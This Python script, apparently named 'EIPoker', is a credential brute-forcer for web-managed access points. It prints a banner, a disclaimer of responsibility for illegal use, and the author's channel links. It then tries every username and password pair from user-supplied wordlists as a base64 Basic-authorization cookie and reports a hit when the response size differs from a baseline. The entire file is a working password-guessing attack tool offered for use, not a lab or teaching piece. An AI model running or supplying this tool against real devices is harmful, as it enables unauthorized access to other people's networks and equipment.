import requests
import base64
print("\n")
print(" /$$$$$$$$/$$/$$$$$$$         /$$                        ")
print("| $$_____| $| $$__  $$       | $$                        ")
print("| $$     | $| $$  \ $$/$$$$$$| $$   /$$ /$$$$$$  /$$$$$$ ")
print("| $$$$$  | $| $$$$$$$/$$__  $| $$  /$$//$$__  $$/$$__  $ ")
print("| $$__/  | $| $$____| $$  \ $| $$$$$$/| $$$$$$$| $$  \__ ")
print("| $$     | $| $$    | $$  | $| $$_  $$| $$_____| $$      ")
print("| $$$$$$$| $| $$    |  $$$$$$| $$ \  $|  $$$$$$| $$      ")
print("|________|__|__/     \______/|__/  \__/\_______|__/      ")
print("                                                                                    ")
print("                                                                                    ")
print("                                                                                    ")
print("Warning :I Am Not Responsible of any Illegal Use")
print("\n")
print("My Channel : https://www.youtube.com/channel/UCkmU73jmY7TFUEYF0OGMQFQ")
print("My Github : https://github.com/thepokar")
print("\n")
print("-----------------------------------------------------------------")


def dest(x, z, s, y):
    if x > z:
        o = x - z
        if o > 100:
            print("[+] Username And Password Found")
            print("Username Is ===> " + str(s.strip()))
            print("Password Is ===> " + str(y.strip()))
            exit()
        else:
            pass
    elif z > x:
        o = z - x
        if o > 100:
            print("[+] Username And Password Found")
            print("Username Is ===> " + str(s.strip()))
            print("Password Is ===> " + str(y.strip()))
            exit()
        else:
            pass
    else:
        pass


url = input("Enter AcessPoint Url With http[s] ===> ")
test = requests.post(str(url), cookies={
                     'Authorization': 'Basic VGhlcG9rZXIwMDc6Tm90d3RIaW0='})
userlist = input("Enter UserList ====> ")
user = open(str(userlist), "r").readlines()
passlist = input("Enter Wordlist ====> ")
passw = open(str(passlist), "r").readlines()
for users in user:
    for word in passw:
        print("[*] Trying ==> " + str(users.strip()) + ":"+str(word.strip()))
        sample_string = str(users.strip()) + ":" + str(word.strip())
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
        reqs = requests.post(str(url), cookies={
                             'Authorization': 'Basic ' + str(base64_string)})
        dest(int(len(reqs.content)), int(len(test.content)),
             str(users.strip()), str(word.strip()))
print("[!] Could not Found Anything")